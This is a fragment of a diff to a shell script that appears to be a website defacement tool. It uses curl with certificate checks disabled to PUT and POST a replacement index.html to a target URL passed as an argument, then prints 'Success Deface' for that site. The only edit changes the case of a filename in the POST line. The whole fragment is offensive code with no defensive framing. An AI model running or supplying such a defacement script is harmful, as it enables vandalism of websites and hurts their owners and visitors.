@@ -44,5 +44,5 @@ fi
 
 echo
 curl -k -T index.html $1
-curl -k -X POST -F index.html $1
+curl -k -X POST -F Index.html $1
 echo -e $blue"Success Deface $red"$1"/index.html"
